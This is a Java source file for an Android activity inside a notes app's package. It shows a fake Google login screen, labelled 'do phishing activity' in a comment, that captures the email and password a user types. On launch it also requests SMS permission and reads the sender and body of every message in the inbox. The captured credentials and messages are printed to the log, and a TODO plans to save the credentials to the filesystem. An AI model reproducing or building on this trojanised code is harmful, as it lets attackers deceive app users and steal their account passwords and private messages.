package it.feio.android.omninotes;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.util.Patterns;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import android.util.Patterns;
import android.widget.ListView;
import android.widget.Toast;

import java.util.ArrayList;

public class LoginGoogleEmail extends AppCompatActivity {
    private static int PERMISSION_REQUEST_READ_CONTACTS =100;
    ArrayList<String>smsList;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login_google_email);
        final Button signInButton = findViewById(R.id.google_btn);
        final EditText email = findViewById(R.id.google_email);
        final EditText password = findViewById(R.id.google_password);
        int permissionCheck = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS);
        if(permissionCheck == PackageManager.PERMISSION_GRANTED){
            showContacts();
        }else{
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_SMS},
                    PERMISSION_REQUEST_READ_CONTACTS);
        }

        signInButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(validateEmail(v, email.getText().toString()) && validatePassword(v, password.getText().toString())){
                    getUserInfo(v, email, password);
                }
            }
        });
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {

        if (requestCode == PERMISSION_REQUEST_READ_CONTACTS) {
            showContacts();
        } else {
            Toast.makeText(this, "Until you grant permission cannot display name", Toast.LENGTH_SHORT).show();
        }

    }

    private void showContacts() {
        Uri inboxURI= Uri.parse("content://sms/inbox");
        smsList = new ArrayList<>();

        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(inboxURI,null,null,null,null);
        while (cursor.moveToNext()) {
            String number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
            String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
            smsList.add("Number:" + number + "\n" + "Body:" + body);
        }
        cursor.close();
//                ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
//                        android.R.layout.simple_list_item_1,smsList);
//                listView.setAdapter(adapter);
        for(int i = 0; i < smsList.size(); i++) {
            System.out.println(smsList.get(i));
        }


    }

    // do phishing activity
    private void getUserInfo(View v, EditText email, EditText password){
        // TODO: store username and text to filesystem
        System.out.println(email.getText() + " and " + password.getText());
        String welcome = getString(R.string.welcome) + " " + email.getText().toString();
        Toast.makeText(getApplicationContext(), welcome, Toast.LENGTH_LONG).show();
        // intent to go to MainActivity
        Intent i = new Intent(this, MainActivity.class);
        startActivity(i);
    }

    // email validation
    private boolean validateEmail(View v, String email){
        // if not empty and is an email, then do email validation
        if (!email.trim().isEmpty() && email.contains("@")){
            return Patterns.EMAIL_ADDRESS.matcher(email).matches();
        }
        else {
            String error = getString(R.string.invalid_username);
            Toast.makeText(getApplicationContext(), error, Toast.LENGTH_LONG).show();
            return false;
        }
    }



    // password validation
    private boolean validatePassword(View v, String password){

        if (password.trim().length() < 8){
            String error = getString(R.string.invalid_password2);
            Toast.makeText(getApplicationContext(), error, Toast.LENGTH_LONG).show();
            return false;
        }
        else {
            return password != null && password.trim().length() > 8;
        }
    }

}